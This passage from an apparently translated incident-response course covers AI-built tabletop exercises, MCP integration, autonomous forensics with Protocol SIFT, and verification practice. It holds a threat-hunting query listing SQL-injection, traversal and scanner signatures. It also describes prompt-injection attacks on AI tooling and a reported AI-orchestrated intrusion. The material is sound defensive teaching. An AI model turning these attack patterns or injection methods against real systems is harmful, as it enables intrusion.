### Рисунок 159. Google Gemini Organizationally-Grounded Tabletop Exercise Scenario Generation

THIRD_PARTY_REVIEW_REQUIRED.

Source lesson:

> realism improves when exercise artifacts are grounded in actual organizational data.

### Рисунок 160. Google Gemini Tabletop Exercise Scenario Output

THIRD_PARTY_REVIEW_REQUIRED.

Other useful organizational artifacts:

- PCAP/network traffic;
- cloud audit logs;
- EDR telemetry;
- system inventories;
- identity events.

Important requirement:

- enough sample data to establish format/normal baseline;
- sanitize sensitive data first.

# Gamified, Interactive Exercise Generation with Twine

Twine is an open-source tool for nonlinear interactive narratives.

For IR training it can create:

- branching decisions;
- conditional paths;
- rich HTML output;
- replayable incident scenarios.

### Рисунок 161. Twine Story Authoring Interface

THIRD_PARTY_REVIEW_REQUIRED.

### Рисунок 162. Twine HTML Output Example

THIRD_PARTY_REVIEW_REQUIRED.

Traditional tabletop:

- often linear;
- facilitator reveals injects sequentially.

Interactive tabletop:

- participant decisions change scenario path;
- choices can reveal consequences.

Example source logic:

- contain too early before scope → miss compromised systems;
- scope effectively using IOC → unlock more evidence/TTP insight.

AI can generate Twine-compatible \`.twee\` files.

Twee uses plain-text passages and links.

### Listing 135. Twee Format Example

~~~text
:: StoryTitle
The Incident Response Book Author

:: Start
You sit down at your desk, coffee in hand, ready to write your book on incident response. The
blank page stares back at you.

Where do you begin?

[[Start with the fundamentals of IR->Fundamentals]]
[[Jump straight into real-world case studies->CaseStudies]]

:: Fundamentals
You decide to lay the groundwork first. Chapter 1: "What is Incident Response?"

You write about the DAIR model: Prepare, Detect, Verify/Triage, Scope, Contain, Eradicate,
Recover, Debrief. You explain each phase with clear examples.

[[Continue to detection techniques->Detection]]
[[Add a war story from your past->WarStory]]

:: CaseStudies
You open with a gripping supply chain hack: Supply Chain Calamity. You provide first person
perspectives from the incident response analyst, and the attacker.

[[Add a brief intro chapter first->Fundamentals]]
[[Trust the reader and keep going->Detection]]
~~~

Twine syntax:

- each passage begins with \`:: PassageName\`;
- links use \`->TargetPassage\`.

# GAMIFIED LEARNING FOR INCIDENT RESPONSE TRAINING

Source highlights four gamification benefits.

## Choice and Consequence

Branching decisions:

- increase engagement;
- make consequences visible;
- connect actions to outcomes.

## Safe Experimentation

Participants can test risky choices without real incident impact.

Example:

- delay containment to collect evidence;
- observe attacker escalation.

This reduces fear of making the “wrong” choice publicly.

## Replayability and Mastery

Interactive exercises can be replayed through different paths.

Benefits:

- pattern recognition;
- comparison of strategies;
- decision-confidence building.

## Engagement Through Agency

Participants actively choose rather than passively listen.

Agency improves:

- engagement;
- retention;
- learning transfer.

Gamification must still serve learning objectives rather than entertainment alone.

# AI-Generated Twine Scenarios

Source provides a prompt at:

\`https://urls.sec504.org/twinetabletopprompt\`

The prompt asks context questions:

1. incident type;
2. target organization;
3. detection source;
4. critical systems/data at risk;
5. threat actor profile;
6. learning objectives;
7. supporting docs/logs/context.

Detailed answers improve organizational alignment.

### Listing 136. Twine Tabletop Exercise Prompt Setup

~~~bash
$ wget -q -O PROMPT.md https://urls.sec504.org/twinetabletopprompt
$ ls -l
total 32
-rw-r--r--@ 1 jwright  staff    12K Jan 17 11:22 PROMPT.md
~~~

Then Claude Code is instructed to process the prompt file.

### Рисунок 163. Claude Code Twine Tabletop Exercise Prompt Processing

THIRD_PARTY_REVIEW_REQUIRED.

Prompt instruction shown in source:

~~~text
Read and process the prompt directions in @PROMPT.md
~~~

Source notes similar filesystem-assisted workflows are possible with:

- OpenAI Codex;
- Google Gemini CLI.

### Рисунок 164. Claude Code Twine Tabletop Exercise Prompt Question

THIRD_PARTY_REVIEW_REQUIRED.

After answers are supplied, model generates a \`.twee\` file.

### Рисунок 165. AI-Generated Twine Tabletop Exercise Decision Passages

THIRD_PARTY_REVIEW_REQUIRED.

Build to HTML and navigate as interactive scenario.

### Рисунок 166. AI-Generated Twine Tabletop Exercise Story View

THIRD_PARTY_REVIEW_REQUIRED.

Source prompt supports event saves, allowing participants to:

- save progress;
- choose a path;
- return to earlier save;
- test alternate decisions.

Intermediate techniques therefore cover:

- report drafting;
- playbook generation;
- interactive exercise creation.

They require relatively little infrastructure beyond AI access.

# ADVANCED USE CASES

Advanced workflows add:

- external-system integration;
- automated data retrieval;
- real-time analysis;
- orchestrated response actions.

Key technologies:

- Model Context Protocol (MCP);
- agentic AI systems.

These can execute multi-step tasks with reduced manual tool handling.

# Model Context Protocol for Defensive Operations

Advanced AI workflows can offload:

- data gathering;
- enrichment;
- correlation;
- ticket updates;
- repetitive query work.

This frees analysts for:

- decision-making;
- scoping;
- containment;
- higher-value analysis.

MCP provides a standardized integration layer between AI models and security tooling.

# Understanding MCP Architecture

Source defines three main components.

## MCP Client

The user-facing AI interface:

- chat application;
- IDE;
- custom interface.

## MCP Server

A service exposing tools that the model can invoke.

Tools may:

- retrieve data;
- execute queries;
- take actions.

## Underlying Applications

Actual systems/data sources:

- SIEM;
- ticketing;
- CTI;
- cloud services;
- source control;
- other security platforms.

### Рисунок 167. MCP Architecture Diagram

THIRD_PARTY_REVIEW_REQUIRED.

Flow:

1. user submits natural-language request;
2. client exposes available tools to model;
3. model chooses a tool;
4. MCP server executes;
5. results return to model;
6. model synthesizes response.

Example requests from source:

- find failed logins followed by successful logins in last 24 hours;
- enrich \`login.c1ic.link\` with CTI;
- create/assign incident ticket.

# Defensive Applications

## Natural-Language Threat Hunting

Analyst can describe the hunt instead of writing platform-specific syntax.

Example:

> Find systems that communicated with newly registered domains in the past week.

MCP can translate this into backend SIEM/CTI queries.

Benefits:

- lowers query-language barrier;
- reduces context switching;
- helps experienced hunters express hypotheses faster;
- reduces institutional dependence on proprietary SIEM syntax.

## Automated Enrichment

For an indicator, MCP may collect:

- reputation;
- historical sightings;
- related IOC;
- asset context.

This replaces manual cross-tool lookups.

## Cross-Platform Correlation

MCP can query multiple systems:

- EDR;
- firewall;
- email security;
- CTI;
- identity.

Example:

- find all activity associated with one IP across platforms.

## Incident Documentation

Ticketing integration allows conversational updates to incident records.

Benefit:

- reduces stale tickets;
- keeps documentation synchronized with investigation.

# Security Considerations

MCP expands the attack surface.

## Prompt Injection

External data may contain malicious instructions.

Potential injection surfaces:

- logs;
- EDR service descriptions;
- CTI text;
- tool output.

Models may struggle to distinguish:

- data to analyze;
- instructions to obey.

Impact may include:

- sensitive-data disclosure;
- unauthorized actions;
- behavior manipulation.

When MCP converts model output into:

- shell commands;
- SQL/database queries;

prompt injection can become classic command/query injection.

## Access Control

MCP must not grant more privilege than direct access.

Example:

If analyst cannot reset passwords directly, MCP should not enable it conversationally.

Use:

- RBAC;
- scoped credentials;
- least privilege.

## Audit Logging

Log every MCP invocation with:

- actor;
- tool;
- parameters;
- time;
- result.

Integrate logs with:

- SIEM;
- dedicated audit store.

## Data Exposure

Tool output becomes model context.

Sensitive categories may require prohibition/additional controls:

- PII;
- credentials;
- regulated data.

Commercial platform retention policies still apply.

Source notes MCP security research is evolving; organizations should track updated security guidance.

# MCP SUPPLY CHAIN AND REGISTRY RISKS

MCP servers may be independent/unvetted software.

Source flags risky installation patterns such as:

- pipe \`curl\` to shell;
- no version pinning;
- no signing;
- no package locking.

Threats include:

- typosquatting;
- impersonation;
- malicious updates;
- developer-account takeover;
- auto-update trust abuse.

### Рисунок 168. Box.com MCP Server Installation Anti-Pattern

THIRD_PARTY_REVIEW_REQUIRED.

Recommended controls:

- audit MCP servers before use;
- least-privilege credentials;
- sandbox/containerize;
- restrict network egress;
- maintain internal vetted registry.

# MCP Integration for Threat Hunting

Source uses OpenSearch as an example.

OpenSearch is described as an open-source fork of Elasticsearch/Kibana ecosystem with similar query concepts.

### Listing 137. OpenSearch Lucene Web Log Threat Hunting Query Example

~~~text
(http.response.status_code:(400 OR 401 OR 403 OR 404 OR 500) AND -source.address:"127.0.0.1") OR
url.original:(*..* OR *%2e%2e* OR *passwd* OR *wp-admin* OR *phpMyAdmin* OR *shell* OR *eval* OR
*base64*) OR url.original:(*union* AND *select*) OR url.original:(*%27* AND *OR*) OR
url.original:(*SLEEP* OR *BENCHMARK* OR *information_schema*) OR user_agent.original:(*nikto* OR
*sqlmap* OR *nmap* OR *masscan* OR *zgrab* OR *gobuster* OR *dirbuster* OR *wfuzz* OR *nuclei*)
OR tags:(potential_attack OR scanner)
~~~

### Рисунок 169. OpenSearch Lucene Web Log Threat Hunting Query Result

THIRD_PARTY_REVIEW_REQUIRED.

Natural-language equivalent from source asks to:

- review Apache logs for two weeks;
- identify SQL injection;
- prioritize responses where server did not return 500.

Claude Desktop + MCP generated queries and required analyst approval.

### Рисунок 170. Claude Desktop OpenSearch MCP Query Approval

THIRD_PARTY_REVIEW_REQUIRED.

This is a HITL safeguard:

- model proposes query;
- analyst reviews;
- analyst approves;
- query executes.

### Рисунок 171. OpenSearch MCP Natural-Language Threat Hunting Query Example

THIRD_PARTY_REVIEW_REQUIRED.

Important limitation:

Source testing found AI-generated OpenSearch analysis useful but incomplete.

Therefore MCP augments analyst capability, not replaces comprehensive threat hunting.

Multi-MCP workflows can combine:

- search;
- summary;
- tabular findings;
- ticket creation.

Example source request:

- summarize attack activity;
- attach detailed logs;
- create JIRA ticket;
- assign web security team.

# Forensic Analysis Acceleration with Protocol SIFT

AI is changing both offensive and defensive operations.

Defenders must accelerate investigation as attackers accelerate campaign execution.

# Autonomous Adversaries

Source discusses AI-orchestrated intrusion campaigns.

Potential effects:

- faster reconnaissance;
- rapid exploit iteration;
- parallel targeting;
- reduced attacker labor;
- lower skill barrier.

Source cites Anthropic's September 2025 report about GTG-1002.[5]

Reported campaign scope:

- ~30 global organizations;
- technology;
- finance;
- chemical manufacturing;
- government.

Anthropic claimed Claude Code was used for:

- recon;
- vulnerability discovery;
- validation;
- exploitation;
- credential harvesting;
- data collection.

Source reports Anthropic's claim that model performed about 80–90% of operational work.

### Рисунок 172. Anthropic GTG-1002 Threat Actor Campaign Architecture [6]

THIRD_PARTY_REVIEW_REQUIRED.

Source explicitly notes controversy:

- detailed forensic evidence/IOC were not publicly released;
- the claim's veracity has been questioned.[7]

Therefore this is treated as an early indicator of possible future capability, not independently verified incident fact.

# Accelerating Forensic Investigations

Manual forensic workflows may be slower than modern attack progression.

Source introduces **Protocol SIFT**, a SANS framework integrating:

- Claude Code;
- SIFT Workstation;
- ReAct agents;
- forensic utilities.

Goal:

- orchestrate forensic tools via natural-language investigative goals.

### Рисунок 173. Protocol SIFT Analyst Opportunity

THIRD_PARTY_REVIEW_REQUIRED.

# From Tool Use to Tool Orchestration

Traditional forensics requires precise syntax for many tools.

Examples:

- \`log2timeline.py\`;
- \`RECmd\`;
- \`psort.py\`.

Protocol SIFT changes analyst role:

from:

- memorizing syntax;
- manually selecting tools;
- troubleshooting flags;

to:

- state investigative objective;
- review/approve tool actions;
- evaluate results.

Source prompt example:

~~~text
Use the forensics data included in /mnt/hgfs to build a timeline of activity for November 2025.
Identify threats that indicate malicious activity against the system.
~~~

The resulting autonomous workflow continues in the next source range.

# Protocol SIFT Autonomous Workflow

### Рисунок 174. Claude Code Analysis Prompt on SIFT Workstation

THIRD_PARTY_REVIEW_REQUIRED — product/model screenshot not reproduced.

Source reports that Protocol SIFT autonomously performed a multi-step workflow:

- identified evidence in \`/mnt/hgfs\` as VMware Workstation artifacts;
- reviewed:
  - VMware logs;
  - screenshots;
  - virtual disks;
  - memory dumps;
- mounted VMDK read-only using \`qemu-nbd\`;
- identified malware:
  - \`AnalyticsInstaller.exe\`;
  - \`analytics.exe\`;
- decoded embedded content using:
  - \`strings\`;
  - \`base64\`;
- searched Windows memory for evidence of:
  - Meterpreter;
  - Mimikatz;
  - network activity;
- parsed Windows Event Logs:
  - Security;
  - PowerShell Operational;
- used \`evtxexport\`;
- reviewed Prefetch;
- built execution timeline;
- documented attack chain;
- documented persistence;
- compiled IOC.

### Таблица 48. Protocol SIFT Timeline of Malicious Activity

| Timestamp | Event | Evidence source |
|---|---|---|
| 15:55:26 | VM powered on | VMware log |
| 15:56:XX | System boot/user login | Prefetch: explorer.exe, winlogon.exe |
| 15:57:XX | Process Monitor launched | Prefetch: PROCMON64.EXE |
| 15:58:XX | analytics.exe executed | Prefetch: ANALYTICS.EXE-DD592902.pf |
| 16:23:XX | AnalyticsInstaller.exe executed | Prefetch: ANALYTICSINSTALLER.EXE-E57CE4F0.pf |
| 16:23:XX | cmd.exe spawned by malware | Prefetch + memory dump |
| 16:23:XX | PowerShell encoded command executed | Prefetch: POWERSHELL.EXE |
| 16:33:XX | Screenshot captured | Prefetch: SNIPPINGTOOL.EXE |

### Рисунок 175. Protocol SIFT Forensic Findings

THIRD_PARTY_REVIEW_REQUIRED.

Source lesson:

natural-language direction + autonomous orchestration + iterative analysis can reduce time spent on low-level tool handling.

# REACT AGENTS: REASONING AND ACTING FOR ENHANCED AI CAPABILITIES

Protocol SIFT uses the ReAct paradigm.[8]

ReAct combines:

- reasoning;
- external actions;
- observations;
- iterative adjustment.

## ReAct Cycle

1. Receive task and plan approach.
2. Execute an action:
   - command;
   - API;
   - search;
   - tool.
3. Observe result.
4. Update approach.
5. Repeat until:
   - objective satisfied;
   - human intervention required.

### Рисунок 176. Protocol SIFT ReAct Workflow Diagram

THIRD_PARTY_REVIEW_REQUIRED.

## Reasoning and External Verification

Source describes stepwise problem decomposition, e.g.:

- need timeline;
- identify disk format;
- select parsing tool;
- inspect result;
- adapt.

Operational value comes from combining model planning with deterministic tool output.

## Action Capabilities

Possible actions include:

- terminal forensic utilities;
- file inspection;
- documentation lookup;
- threat-intelligence search;
- remote systems via supported interfaces;
- sandbox or analysis-service interaction;
- human approval requests.

# MCP Integration

MCP gives the ReAct agent a standardized interface to:

- local forensic tools;
- remote data;
- proprietary platforms;
- SIEM;
- CTI;
- sandbox services.

Organizations can extend capability by exposing internal tools through vetted MCP servers.

# Accuracy and Deep Understanding

Source identifies accuracy improvements from:

- iterative refinement;
- deterministic tools;
- current external information where available;
- analyst-visible actions;
- hypothesis testing.

Forensics benefits when evidentiary facts originate from deterministic parsers rather than free-form model inference.

# Trust Mechanisms in Autonomous Forensics

Autonomous AI creates concerns about:

- evidence integrity;
- reproducibility;
- hallucination;
- legal defensibility.

Source explicitly notes this is an active area of research/debate.

Early adopters should treat forensic soundness as a primary architecture requirement.

# Inference Constraint

Protocol SIFT uses a high inference constraint.

Boundary:

- AI decides tool sequence;
- AI interprets structured outputs;
- evidentiary facts come from deterministic tools.

Example:

For registry analysis:

- \`RECmd\` parses hive;
- AI reasons over parser output;
- AI should not invent raw-registry content.

Benefits:

- reduces hallucinated facts;
- separates evidence from inference;
- supports reproducibility.

# Human in the Loop (HITL)

Protocol SIFT defaults to read-only orientation and requests approval for state-changing operations.

Before execution:

- show exact command;
- request analyst approval.

Analysts can allowlist common read-only tools such as:

- \`fls\`;
- \`icat\`;
- \`exiftool\`.

Commands that modify:

- files;
- system state;
- evidence;

require explicit approval.

# Forensically Sound Tools

Protocol SIFT orchestrates established tools.

Examples:

- The Sleuth Kit;
- Volatility Framework;
- Eric Zimmerman utilities;
- Plaso/log2timeline;
- RECmd.

Core principle:

> AI orchestrates; trusted tools generate evidence.

This allows manual reproduction of the same results.

# Auditability and Documentation

Protocol SIFT logs:

- model version;
- analyst prompt;
- generated commands;
- tool outputs;
- approval decisions.

This supports:

- review;
- reproducibility;
- legal scrutiny;
- investigation reconstruction.

### Listing 138. Claude Code Audit Log Example

THIRD_PARTY_REVIEW_REQUIRED — the source includes third-party/model internal reasoning text and tool-use JSON. Reader-facing translation preserves the audit-log structure and forensic significance without reproducing hidden/reasoning content verbatim.

Preserved structure:

~~~json
{
  "message": {
    "model": "claude-opus-4-5-20251101",
    "content": [
      {
        "type": "thinking",
        "thinking": "[model reasoning captured in source audit log; omitted in translation]"
      }
    ]
  }
}
{
  "message": {
    "model": "claude-opus-4-5-20251101",
    "content": [
      {
        "type": "tool_use",
        "name": "Bash",
        "input": {
          "command": "find /mnt/windows/Users/Sec504 -name \"*PowerShell*\" -o -name \"*history*\" -o -name \"ConsoleHost_history.txt\" 2>/dev/null",
          "description": "Find PowerShell history files"
        }
      }
    ]
  }
}
~~~

Source footnotes note:

- JSONL excerpt edited for brevity;
- shown command was generated by Claude Code to locate PowerShell history files.

The important evidentiary point is that audit history can show:

- what was asked;
- what tool was selected;
- exact command;
- approval;
- output.

# OPERATIONAL CONSIDERATIONS

AI integration must include:

- verification;
- documentation;
- skill development.

# Verification and Trust

AI output must be verified before being treated as factual.

## Log Analysis Verification

If AI claims beaconing every five minutes:

- inspect timestamps;
- verify calculation;
- confirm source pattern.

Pattern identification is a hypothesis until confirmed.

## Report Verification

Every factual claim should trace to source evidence.

Especially verify:

- quotes;
- statistics;
- timelines;
- causality.

AI should change presentation, not facts.

## Playbook Verification

Generated playbooks should be:

- reviewed by SMEs;
- syntax checked;
- tool-reference checked;
- tested where possible.

Potential failures:

- invalid syntax;
- nonexistent features;
- environment-inappropriate procedures.

## Document Verification

For significant findings document the validation:

- AI-assisted finding;
- verification method;
- analyst/SME confirmation.

# Documentation Practices

When AI contributes, documentation should record:

- AI tool used;
- purpose;
- verification performed.

Example provenance pattern:

- AI-assisted deobfuscation;
- behavior verified in isolated environment.

If AI identifies a log pattern:

- note AI assistance;
- cite timestamp range;
- document manual confirmation.

Preserve AI interaction logs when they materially contribute to significant conclusions.

This can improve:

- reproducibility;
- defensibility;
- continuous improvement.

Documentation must distinguish:

- AI-suggested hypothesis;
- verified finding.

# Reproducibility, Defensibility, Continuous Improvement

**Reproducibility**

Others can reconstruct analytical path.

**Defensibility**

Conclusions are supported by evidence and verification, not model reputation.

**Continuous Improvement**

Review AI-assisted workflows to identify:

- strong use cases;
- weak use cases;
- prompt improvements.

# Building Organizational Capability

AI adoption should be intentional across the team, not isolated to individual enthusiasts.

Benefits increase when analysts share:

- prompts;
- workflows;
- verification practices;
- lessons learned.

# Prompt Libraries

Effective prompts are reusable assets.

Store them in:

- docs;
- wiki;
- version control.

Prompt libraries:

- reduce duplicate effort;
- give junior analysts starting points;
- support consistent output;
- enable team refinement.

# Skill Files and Prompt Library Integration

Source notes reusable skill/prompt files in environments such as:

- Claude Code;
- OpenAI Codex;
- Gemini CLI.

Embedding reusable prompts into the AI environment reduces friction.

Source gives a Sigma-rule skill example.

### Listing 139. Claude Code Skill File Example — Beginning

~~~text
$ pwd
/Users/jwright/forensics
$ cat .claude/commands/sigma.md
---
description: Generate Sigma detection rules from attack descriptions or observed artifacts
---

Generate Sigma detection rules from analyst input: behavior descriptions, observed artifacts, or
MITRE ATT&CK technique references.

## Process

1. Parse input to identify log source, detection fields, and attack context
2. Map to log source
3. Build detection logic
4. Generate complete YAML
5. Provide context including conversion commands for target SIEMs
~~~

The skill defines mappings such as:

- Windows process execution → \`process_creation\`;
- PowerShell → \`ps_script\`;
- registry → \`registry_event\`;
- network → \`network_connection\`;
- Linux process → \`process_creation\`;
- AWS → \`cloudtrail\`.

Output template continues in the next source range.

# Sigma Skill Example — Completion

Source skill defines a reusable Sigma output template containing:

- title;
- UUID;
- status;
- description;
- references;
- author;
- date;
- ATT&CK tags;
- logsource;
- detection selections;
- condition;
- false positives;
- severity.

Example input in source:

~~~text
/sigma outlook.exe spawning cmd.exe or powershell.exe
~~~

Example generated rule detects Outlook spawning command interpreters.

### Listing 139. Claude Code Skill File Example — Output Template and Example

~~~yaml
title: Email Client Spawning Command Shell
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects Outlook spawning command interpreters, indicating possible malicious
  attachment execution.
references:
  - https://attack.mitre.org/techniques/T1204/002/
author: IR Team
date: 2025/01/24
tags:
  - attack.execution
  - attack.t1204.002
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith: '\outlook.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate Outlook add-ins
level: high
~~~

Source notes the reusable skill is available at:

\`https://urls.sec504.org/sigmaskill\`

Example invocation with additional context:

~~~text
/sigma Process created cmd.exe spawning from outlook.exe with command line containing "http"
~~~

### Рисунок 177. Claude Code Sigma Rule Generation Example

THIRD_PARTY_REVIEW_REQUIRED.

Prompt libraries and skill files improve:

- reuse;
- consistency;
- adoption;
- team capability.

# Use Case Documentation

Organizations should document which AI use cases:

- worked well;
- performed poorly;
- were not appropriate.

This prevents teams from repeatedly attempting already-failed approaches.

It also accelerates onboarding of new team members.

# Training

Structured training should cover both:

- capabilities;
- limitations.

Practical exercises help analysts develop intuition about where AI helps and where traditional techniques remain better.

Potential exercises:

- malware analysis;
- report generation;
- log analysis;
- prompt troubleshooting.

# Structured Learning Paths

Source uses a scaffolding model.

## Foundational

- how LLMs work at a practical level;
- hallucinations/failure modes;
- basic prompting.

## Intermediate

- log analysis;
- code review;
- report generation.

## Advanced

- multi-step analysis chains;
- API/tool integration;
- specialized prompt optimization.

General AI familiarity does not automatically imply effective security use.

Security-specific training is needed.

# Practical Training Exercises

### Таблица 49. Suggested Training Exercises for AI-Assisted Incident Response

| Level | Exercise |
|---|---|
| Foundational | Give a simple obfuscated script; compare prompts that decode/explain it |
| Foundational | Give logs with obvious malicious pattern; craft prompts to identify it |
| Foundational | Generate executive summary from technical report and critique accuracy/completeness |
| Intermediate | Analyze complex malware through sequential prompts |
| Intermediate | Generate draft report from sanitized real case notes; compare team results |
| Intermediate | Create detection rules from CTI and test against known-good/known-bad samples |
| Advanced | Analyze unfamiliar log format and identify anomalies |
| Advanced | Integrate multiple evidence sources such as logs, PCAP, memory |
| Advanced | Attempt adversarial prompting to make model produce incorrect analysis, building verification intuition |

Labs are preferred because analysts can experiment without production pressure.

# Cross-Training Considerations

AI knowledge should not be isolated to a specialist AI team.

Cross-train responders so capability exists regardless of case assignment.

Useful approach:

- pair experienced AI users with developing analysts;
- share effective prompts;
- demonstrate troubleshooting;
- teach when **not** to use AI.

Technical knowledge matters, but source also emphasizes:

- experimentation;
- willingness to fail safely;
- creativity.

Organizational benefit comes from consistent team capability rather than a few early adopters.

# LOOKING FORWARD

Generative AI will evolve rapidly.

Specific prompt patterns may age, so teams should periodically reassess whether complex prompts can be simplified as model capability improves.

Trends highlighted:

## Better Multi-Step Reasoning

Tasks requiring elaborate prompt structure may become easier.

Review existing prompts periodically.

## Maturing Agent/MCP Ecosystem

MCP and related standards may make security-tool integration easier.

Possible outcomes:

- less custom development;
- more turnkey integrations;
- broader vendor support.

## Security-Specific Models

Source cites Cisco Foundation-sec-8b as an example of a security-focused small language model.[9]

Potential benefits claimed by source/reference:

- cybersecurity vocabulary;
- security-specific benchmarks;
- reduced hallucination relative to similar-size general models;
- local hosting affordability.

Trade-off:

- narrower capability outside specialized domain.

# Stable Principles

Even as models change, four principles remain:

1. **AI accelerates analysis but does not replace human judgment.**
2. **Verification remains essential.**
3. **Organizational policy must control what data can be shared with AI.**
4. **Documentation must record how conclusions were reached.**

Attackers are also adopting AI.

Defenders can use AI to improve response time, but success depends on disciplined integration rather than hype-driven deployment.

The source closes with the idea that the durable advantage belongs not to the teams that adopt AI first, but to teams that integrate it thoughtfully while maintaining:

- verification rigor;
- analytical skepticism;
- experimentation;
- practice;
- continuous learning.

# Сноски и источники

[1] Narayanan, A., & Shmatikov, V., "How to Break Anonymity of the Netflix Prize Dataset," arXiv preprint arXiv:cs/0610105, October 2006, arxiv.org/abs/cs/0610105

[2] Incident Response Playbook Generation Structured Prompt, gist.github.com/joswr1ght/e3902b170b08396fd2b4c46500a56498

[3] Hague, Sabastian, "A step-by-step guide to writing incident response reports," Hack The Box, www.hackthebox.com/blog/writing-incident-response-report-template

[4] Zeltser, Lenny, "Good IR Reports with AI," zeltser.com/good-ir-reports-with-ai

[5] Anthropic, "Disrupting the first reported AI-orchestrated cyber espionage campaign," November 2025, www.anthropic.com/news/disrupting-AI-espionage

[6] Anthropic, "Disrupting the first reported AI-orchestrated cyber espionage campaign" (PDF report), November 2025, assets.anthropic.com/m/ec212e6566a0d47/original/Disrupting-the-first-reported-AI-orchestrated-cyber-espionage-campaign.pdf

[7] Janssen, Jan-Keno, "Autonomous AI Cyberattack: Doubts about Anthropic’s Investigation," Heise Online, November 2025, www.heise.de/en/news/Autonomous-AI-Cyberattack-Doubts-about-Anthropic-s-Investigation-11080298.html

[8] Yao, Shunyu et al., "ReAct: Synergizing Reasoning and Acting in Language Models," ICLR 2023, openreview.net/forum?id=WE_vluYUL-X

[9] Singer, Yaron, "Foundation-sec-8b: Cisco Foundation AI’s First Open-Source Security Model," Cisco Blogs, April 2025, blogs.cisco.com/security/foundation-sec-cisco-foundation-ai-first-open-source-security-model
